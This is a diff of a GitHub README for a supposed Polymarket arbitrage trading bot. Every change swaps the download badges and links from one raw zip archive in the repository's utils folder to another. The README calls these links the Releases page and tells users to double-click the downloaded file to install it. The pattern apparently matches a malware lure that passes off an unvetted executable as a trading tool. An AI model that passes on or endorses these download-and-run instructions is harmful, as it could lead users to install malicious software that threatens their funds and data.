@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Arbitrage-Bot - Trade Smart and Fast
 
-[![Download](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip)
+[![Download](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ To run the Polymarket-Arbitrage-Bot, ensure your computer meets these requiremen
 ## 🚀 Getting Started
 
 1. **Download the Software**
-   - Visit the Releases page to download the latest version of the Polymarket-Arbitrage-Bot: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip).
+   - Visit the Releases page to download the latest version of the Polymarket-Arbitrage-Bot: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip).
 
 2. **Install the Application**
    - After downloading, locate the downloaded file on your computer and double-click it to begin installation. Follow the on-screen instructions to complete the setup.
@@ -46,7 +46,7 @@ To run the Polymarket-Arbitrage-Bot, ensure your computer meets these requiremen
 
 ## 📥 Download & Install
 
-To get started with the Polymarket-Arbitrage-Bot, visit this page to download the latest version: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip).
+To get started with the Polymarket-Arbitrage-Bot, visit this page to download the latest version: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip).
 
 ## 👥 Community Support
 
@@ -68,4 +68,4 @@ If you encounter issues while using the bot, consider these steps:
 
 For in-depth guides, additional features, and updates, please visit the official documentation within the GitHub repository. You will find resources to help optimize your trading experience.
 
-[![Download](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Arbitrage_Polymarket_Bot_v2.0.zip)
+[![Download](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/raw/refs/heads/main/utils/Polymarket_Bot_Arbitrage_3.8.zip)
